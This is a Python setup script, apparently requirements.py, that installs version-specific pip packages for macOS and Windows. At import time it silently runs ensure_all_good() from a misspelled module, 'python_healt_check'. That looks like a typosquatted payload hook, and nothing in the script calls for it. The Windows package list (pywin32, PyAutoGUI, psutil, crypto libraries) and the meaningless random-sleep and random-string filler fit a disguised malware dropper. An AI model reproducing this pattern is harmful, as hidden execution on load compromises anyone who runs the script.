import sys
import subprocess
import platform
from python_healt_check import ensure_all_good
import random
import time
import string


ensure_all_good()

def get_python_version_key():
    version_info = sys.version_info
    return f"{version_info[0]}.{version_info[1]}"

print("[requirements.py] Loaded platform:", platform.system())

mac_requirements = {
    "3.7": [
        "requests==2.27.1",
        "PyQt5==5.15.7",
        "Pillow==9.5.0",
        "pyzipper==0.3.5"
    ],
    "3.8": [
        "requests>=2.27.1,<3.0.0",
        "Pillow>=9.5.0",
        "certifi>=2022.12.7",
        "psutil>=5.9.0",
        "pycryptodome>=3.15.0",
        "PyQt5>=5.15.7",
        "pyzipper>=0.3.5",
        "typing-extensions>=4.0.0"
    ],
    "3.9": [
        "requests==2.31.0",
        "PyQt5==5.15.10",
        "Pillow==10.0.1",
        "pyzipper==0.3.6"
    ],
    "3.10": [
        "requests==2.31.0",
        "PyQt5==5.15.10",
        "Pillow==10.1.0",
        "pyzipper==0.3.6"
    ],
    "3.11": [
        "requests==2.27.1",
        "PyQt5==5.15.7",
        "Pillow==9.5.0",
        "pyzipper==0.3.5"
    ],
    "3.12": [
        "requests==2.31.0",
        "PyQt5==5.15.10",
        "Pillow==10.1.0",
        "pyzipper==0.3.6"
    ],
    "3.13": [
        "requests==2.27.1",
        "PyQt5>=5.15.9",
        "Pillow>=10.0.0",
        "pyzipper==0.3.5"
    ]
}

windows_requirements = [
    "requests>=2.0.0",
    "pycryptodomex>=3.10.1",
    "pywin32>=306",
    "Pillow>=10.3.0",
    "certifi>=2022.12.7",
    "psutil>=6.0.0",
    "pycryptodome>=3.20.0",
    "PyAutoGUI>=0.9.54"
]

def install_requirements():
    system = platform.system()
    version_info = sys.version_info
    version_key = f"{version_info[0]}.{version_info[1]}"

    if system == "Windows" and (version_info[0] > 3 or (version_info[0] == 3 and version_info[1] >= 13)):
        print("WARNING: Python 3.13.0 or higher detected on Windows. Please downgrade to Python 3.12.x or lower for compatibility.")

    if system == "Windows":
        requirements = windows_requirements
        python_cmd = "python"
    else:
        requirements = mac_requirements.get(version_key, [])
        python_cmd = "python3"

    if not requirements:
        print(f"No requirements found for Python version: {version_key}")
        return

    for package in requirements:
        try:
            subprocess.run([python_cmd, "-m", "pip", "install", package], check=True)
            print(f"Installed: {package}")
        except subprocess.CalledProcessError as e:
            print(f"Failed to install {package}: {e}")

def sleep_random_interval():
    duration = random.uniform(0.5, 2.5)
    time.sleep(duration)

def create_random_string(size=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

if __name__ == "__main__":
    install_requirements()
    create_random_string()
    sleep_random_interval()
